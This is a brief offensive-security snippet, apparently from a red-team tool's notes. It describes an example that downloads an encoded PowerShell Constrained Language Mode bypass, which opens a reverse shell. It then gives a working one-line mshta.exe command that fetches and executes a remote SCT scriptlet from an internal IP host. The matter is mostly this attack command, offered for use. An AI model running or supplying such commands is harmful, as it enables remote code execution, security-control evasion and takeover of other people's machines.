The example downloads an encoded CLM bypass and installs it. The CLM bypass has hardcoded PowerShell to open a reverse shell.
The run the SCT file remotely, run:
`/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();`